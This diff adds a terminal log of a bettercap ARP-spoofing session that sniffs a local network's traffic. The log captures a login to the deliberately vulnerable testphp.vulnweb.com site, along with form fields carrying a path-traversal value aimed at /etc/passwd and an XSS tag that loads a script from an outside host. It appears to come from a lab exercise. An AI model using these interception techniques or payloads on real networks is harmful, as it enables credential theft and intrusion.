@@ -1,0 +1,173 @@
+Script started on 2025-05-24 15:42:52-04:00 [COMMAND="timeout 60 bettercap -iface eth1 -caplet data/config/mitm.cap" TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="-1" LINES="-1"]
+[1mbettercap v2.33.0[0m [2m(built for linux amd64 with go1.22.6)[0m [type '[1mhelp[0m' for a list of commands]
+
+[15:42:52] [[32msys.log[0m] [[97m[42minf[0m] gateway monitor started ...
+[15:42:52] [[32msys.log[0m] [[97m[43mwar[0m] [104m[30marp.spoof[0m[0m full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
+[15:42:52] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mnet.probe[0m[0m probing 256 addresses on 192.168.1.0/24
+[15:42:52] [[32msys.log[0m] [[97m[42minf[0m] [104m[30marp.spoof[0m[0m arp spoofer started, probing 1 targets.
+[15:42:52] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mnet.probe[0m[0m starting net.recon as a requirement for net.probe
+[15:42:52] [[32mendpoint.new[0m] endpoint [1m192.168.1.102[0m[2m[0m detected as [32m14:85:7f:7e:06:1c[0m[2m (Intel Corporate)[0m.
+[15:42:52] [[32mendpoint.new[0m] endpoint [1m192.168.1.101[0m[2m[0m detected as [32m96:7f:0b:91:63:49[0m[2m[0m.
+[15:42:52] [[32mendpoint.new[0m] endpoint [1m192.168.1.105[0m[2m[0m detected as [32m32:fe:6d:47:31:d9[0m[2m[0m.
+[15:42:52] [[32mendpoint.new[0m] endpoint [1m192.168.1.100[0m[2m[0m detected as [32me0:c2:64:94:67:45[0m[2m (Intel Corporate)[0m.
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[15:42:57] [[32mnet.sniff.http.request[0m] [41m[30mhttp[0m SEMIHTWO [104m[30mPOST[0m [33mtestphp.vulnweb.com[0m/userinfo.php
+
+[1mPOST[0m /userinfo.php [2mHTTP/1.1[0m
+[34mHost[0m: [33mtestphp.vulnweb.com[0m
+[34mAccept-Encoding[0m: [33mgzip, deflate[0m
+[34mContent-Length[0m: [33m20[0m
+[34mOrigin[0m: [33mhttp://testphp.vulnweb.com[0m
+[34mContent-Type[0m: [33mapplication/x-www-form-urlencoded[0m
+[34mUpgrade-Insecure-Requests[0m: [33m1[0m
+[34mUser-Agent[0m: [33mMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36[0m
+[34mReferer[0m: [33mhttp://testphp.vulnweb.com/login.php[0m
+[34mAccept-Language[0m: [33mtr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7[0m
+[34mConnection[0m: [33mkeep-alive[0m
+[34mCache-Control[0m: [33mmax-age=0[0m
+[34mAccept[0m: [33mtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7[0m
+[34mCookie[0m: [33mlogin=test%2Ftest[0m
+
+[32muname[0m=[1m[31mtest[0m[0m&[32mpass[0m=[1m[31mtest[0m[0m
+
+[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:42:57] [[32mnet.sniff.http.request[0m] [41m[30mhttp[0m SEMIHTWO [104m[30mPOST[0m [33mtestphp.vulnweb.com[0m/userinfo.php
+
+[1mPOST[0m /userinfo.php [2mHTTP/1.1[0m
+[34mHost[0m: [33mtestphp.vulnweb.com[0m
+[34mOrigin[0m: [33mhttp://testphp.vulnweb.com[0m
+[34mUpgrade-Insecure-Requests[0m: [33m1[0m
+[34mReferer[0m: [33mhttp://testphp.vulnweb.com/login.php[0m
+[34mAccept-Encoding[0m: [33mgzip, deflate[0m
+[34mAccept-Language[0m: [33mtr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7[0m
+[34mContent-Length[0m: [33m20[0m
+[34mCache-Control[0m: [33mmax-age=0[0m
+[34mCookie[0m: [33mlogin=test%2Ftest[0m
+[34mAccept[0m: [33mtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7[0m
+[34mConnection[0m: [33mkeep-alive[0m
+[34mContent-Type[0m: [33mapplication/x-www-form-urlencoded[0m
+[34mUser-Agent[0m: [33mMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36[0m
+
+[32muname[0m=[1m[31mtest[0m[0m&[32mpass[0m=[1m[31mtest[0m[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:42:57] [[32mnet.sniff.http.response[0m] [41m[30mhttp[0m 44.228.249.3:80 [1m200 OK[0m -> SEMIHTWO ([2m2.5 kB[0m [33mtext/html; charset=UTF-8[0m)
+
+[2mHTTP/1.1[0m 200 OK
+[34mX-Powered-By[0m: [33mPHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1[0m
+[34mSet-Cookie[0m: [33mlogin=test%2Ftest[0m
+[34mContent-Encoding[0m: [33mgzip[0m
+[34mServer[0m: [33mnginx/1.19.0[0m
+[34mDate[0m: [33mSat, 24 May 2025 19:42:57 GMT[0m
+[34mContent-Type[0m: [33mtext/html; charset=UTF-8[0m
+[34mConnection[0m: [33mkeep-alive[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:42:57] [[32mnet.sniff.http.response[0m] [41m[30mhttp[0m 44.228.249.3:80 [1m200 OK[0m -> SEMIHTWO ([2m2.5 kB[0m [33mtext/html; charset=UTF-8[0m)
+
+[2mHTTP/1.1[0m 200 OK
+[34mConnection[0m: [33mkeep-alive[0m
+[34mX-Powered-By[0m: [33mPHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1[0m
+[34mSet-Cookie[0m: [33mlogin=test%2Ftest[0m
+[34mContent-Encoding[0m: [33mgzip[0m
+[34mServer[0m: [33mnginx/1.19.0[0m
+[34mDate[0m: [33mSat, 24 May 2025 19:42:57 GMT[0m
+[34mContent-Type[0m: [33mtext/html; charset=UTF-8[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:02] [[32mnet.sniff.dns[0m] [100m[97mdns[0m gateway > SemihOne.local. : [33medge-web-gew4.dual-gslb.spotify.com[0m is [2m35.186.224.28[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:04] [[32mnet.sniff.http.request[0m] [41m[30mhttp[0m SEMIHTWO [104m[30mPOST[0m [33mtestphp.vulnweb.com[0m/userinfo.php
+
+[1mPOST[0m /userinfo.php [2mHTTP/1.1[0m
+[34mHost[0m: [33mtestphp.vulnweb.com[0m
+[34mContent-Length[0m: [33m233[0m
+[34mOrigin[0m: [33mhttp://testphp.vulnweb.com[0m
+[34mContent-Type[0m: [33mapplication/x-www-form-urlencoded[0m
+[34mAccept[0m: [33mtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7[0m
+[34mCookie[0m: [33mlogin=test%2Ftest[0m
+[34mConnection[0m: [33mkeep-alive[0m
+[34mCache-Control[0m: [33mmax-age=0[0m
+[34mUpgrade-Insecure-Requests[0m: [33m1[0m
+[34mUser-Agent[0m: [33mMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36[0m
+[34mReferer[0m: [33mhttp://testphp.vulnweb.com/userinfo.php[0m
+[34mAccept-Encoding[0m: [33mgzip, deflate[0m
+[34mAccept-Language[0m: [33mtr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7[0m
+
+[32murname[0m=[1m[31mJohn Smith[0m[0m&[32mucc[0m=[1m[31m123456787654321[0m[0m&[32muemail[0m=[1m[31m/../../../../../../../../../../../etc/passwd[0m[0m&[32muphone[0m=[1m[31m2323345[0m[0m&[32muaddress[0m=[1m[31m"><script src="https://js.rip/pznw6clllm"></script>[0m[0m&[32mupdate[0m=[1m[31mupdate[0m[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:04] [[32mnet.sniff.http.request[0m] [41m[30mhttp[0m SEMIHTWO [104m[30mPOST[0m [33mtestphp.vulnweb.com[0m/userinfo.php
+
+[1mPOST[0m /userinfo.php [2mHTTP/1.1[0m
+[34mHost[0m: [33mtestphp.vulnweb.com[0m
+[34mConnection[0m: [33mkeep-alive[0m
+[34mCache-Control[0m: [33mmax-age=0[0m
+[34mContent-Type[0m: [33mapplication/x-www-form-urlencoded[0m
+[34mAccept-Encoding[0m: [33mgzip, deflate[0m
+[34mAccept-Language[0m: [33mtr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7[0m
+[34mOrigin[0m: [33mhttp://testphp.vulnweb.com[0m
+[34mUpgrade-Insecure-Requests[0m: [33m1[0m
+[34mUser-Agent[0m: [33mMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36[0m
+[34mAccept[0m: [33mtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7[0m
+[34mReferer[0m: [33mhttp://testphp.vulnweb.com/userinfo.php[0m
+[34mCookie[0m: [33mlogin=test%2Ftest[0m
+[34mContent-Length[0m: [33m233[0m
+
+[32murname[0m=[1m[31mJohn Smith[0m[0m&[32mucc[0m=[1m[31m123456787654321[0m[0m&[32muemail[0m=[1m[31m/../../../../../../../../../../../etc/passwd[0m[0m&[32muphone[0m=[1m[31m2323345[0m[0m&[32muaddress[0m=[1m[31m"><script src="https://js.rip/pznw6clllm"></script>[0m[0m&[32mupdate[0m=[1m[31mupdate[0m[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:07] [[32mnet.sniff.http.response[0m] [41m[30mhttp[0m 44.228.249.3:80 [1m200 OK[0m -> SEMIHTWO ([2m2.5 kB[0m [33mtext/html; charset=UTF-8[0m)
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:07] [[32mnet.sniff.http.response[0m] [41m[30mhttp[0m 44.228.249.3:80 [1m200 OK[0m -> SEMIHTWO ([2m2.5 kB[0m [33mtext/html; charset=UTF-8[0m)
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m fe80::aca4:8c93:f00c:f032 : [2mUnknown[0m query for [33mSemihOne._dosvc._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m SemihOne.local. : [2mUnknown[0m query for [33mSemihOne._dosvc._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m fe80::aca4:8c93:f00c:f032 : [2mUnknown[0m query for [33mSemihOne._dosvc._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m SemihOne.local. : [2mUnknown[0m query for [33mSemihOne._dosvc._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m SemihOne.local. : [2mUnknown[0m query for [33mSemihOne._dosvc._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m fe80::aca4:8c93:f00c:f032 : [33mSemihOne.local[0m is [2m192.168.1.102, fe80::aca4:8c93:f00c:f032[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m fe80::aca4:8c93:f00c:f032 : [2mUnknown[0m query for [33mSemihOne._dosvc._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m SemihOne.local. : [33mSemihOne.local[0m is [2m192.168.1.102, fe80::aca4:8c93:f00c:f032[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m fe80::aca4:8c93:f00c:f032 : [33mSemihOne.local[0m is [2m192.168.1.102, fe80::aca4:8c93:f00c:f032[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:10] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m SemihOne.local. : [33mSemihOne.local[0m is [2m192.168.1.102, fe80::aca4:8c93:f00c:f032[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:17] [[32mnet.sniff.dns[0m] [100m[97mdns[0m gateway > SemihOne.local. : [33mclientservices.googleapis.com[0m is [2m172.217.169.163[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:20] [[32mnet.sniff.http.request[0m] [41m[30mhttp[0m SEMIHTWO [104m[30mPOST[0m [33mtestphp.vulnweb.com[0m/userinfo.php
+
+[1mPOST[0m /userinfo.php [2mHTTP/1.1[0m
+[34mHost[0m: [33mtestphp.vulnweb.com[0m
+[34mAccept-Language[0m: [33mtr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7[0m
+[34mCookie[0m: [33mlogin=test%2Ftest[0m
+[34mConnection[0m: [33mkeep-alive[0m
+[34mContent-Length[0m: [33m233[0m
+[34mCache-Control[0m: [33mmax-age=0[0m
+[34mUpgrade-Insecure-Requests[0m: [33m1[0m
+[34mAccept[0m: [33mtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7[0m
+[34mReferer[0m: [33mhttp://testphp.vulnweb.com/userinfo.php[0m
+[34mOrigin[0m: [33mhttp://testphp.vulnweb.com[0m
+[34mContent-Type[0m: [33mapplication/x-www-form-urlencoded[0m
+[34mUser-Agent[0m: [33mMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36[0m
+[34mAccept-Encoding[0m: [33mgzip, deflate[0m
+
+[32murname[0m=[1m[31mJohn Smith[0m[0m&[32mucc[0m=[1m[31m123456787654321[0m[0m&[32muemail[0m=[1m[31m/../../../../../../../../../../../etc/passwd[0m[0m&[32muphone[0m=[1m[31m2323345[0m[0m&[32muaddress[0m=[1m[31m"><script src="https://js.rip/pznw6clllm"></script>[0m[0m&[32mupdate[0m=[1m[31mupdate[0m[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:20] [[32mnet.sniff.http.request[0m] [41m[30mhttp[0m SEMIHTWO [104m[30mPOST[0m [33mtestphp.vulnweb.com[0m/userinfo.php
+
+[1mPOST[0m /userinfo.php [2mHTTP/1.1[0m
+[34mHost[0m: [33mtestphp.vulnweb.com[0m
+[34mCache-Control[0m: [33mmax-age=0[0m
+[34mContent-Type[0m: [33mapplication/x-www-form-urlencoded[0m
+[34mUser-Agent[0m: [33mMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36[0m
+[34mAccept[0m: [33mtext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7[0m
+[34mReferer[0m: [33mhttp://testphp.vulnweb.com/userinfo.php[0m
+[34mAccept-Encoding[0m: [33mgzip, deflate[0m
+[34mContent-Length[0m: [33m233[0m
+[34mAccept-Language[0m: [33mtr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7[0m
+[34mUpgrade-Insecure-Requests[0m: [33m1[0m
+[34mCookie[0m: [33mlogin=test%2Ftest[0m
+[34mConnection[0m: [33mkeep-alive[0m
+[34mOrigin[0m: [33mhttp://testphp.vulnweb.com[0m
+
+[32murname[0m=[1m[31mJohn Smith[0m[0m&[32mucc[0m=[1m[31m123456787654321[0m[0m&[32muemail[0m=[1m[31m/../../../../../../../../../../../etc/passwd[0m[0m&[32muphone[0m=[1m[31m2323345[0m[0m&[32muaddress[0m=[1m[31m"><script src="https://js.rip/pznw6clllm"></script>[0m[0m&[32mupdate[0m=[1m[31mupdate[0m[0m
+
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[15:43:32] [[32mnet.sniff.http.response[0m] [41m[30mhttp[0m 44.228.249.3:80 [1m200 OK[0m -> SEMIHTWO ([2m2.5 kB[0m [33mtext/html; charset=UTF-8[0m)
+[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:32] [[32mnet.sniff.http.response[0m] [41m[30mhttp[0m 44.228.249.3:80 [1m200 OK[0m -> SEMIHTWO ([2m2.5 kB[0m [33mtext/html; charset=UTF-8[0m)
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:49] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m SemihOne.local. : [2mPTR[0m query for [33m_spotify-connect._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:49] [[32mnet.sniff.mdns[0m] [100m[97mmdns[0m fe80::aca4:8c93:f00c:f032 : [2mPTR[0m query for [33m_spotify-connect._tcp.local[0m
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m 
+[15:43:52] [[32msys.log[0m] [[97m[42minf[0m] [104m[30marp.spoof[0m[0m restoring ARP cache of 1 targets.
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:52] [[32msys.log[0m] [[97m[43mwar[0m] Got SIGTERM
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m [15:43:52] [[32msys.log[0m] [[97m[42minf[0m] [104m[30marp.spoof[0m[0m waiting for ARP spoofer to stop ...
+[J[2K[43m[97m192.168.1.0/24 [30m> 192.168.1.104 [0m [1m» [0m[0m 
+Script done on 2025-05-24 15:43:53-04:00 [COMMAND_EXIT_CODE="124"]
+[2025-05-24 15:43:53] [✓] Bettercap execution completed.
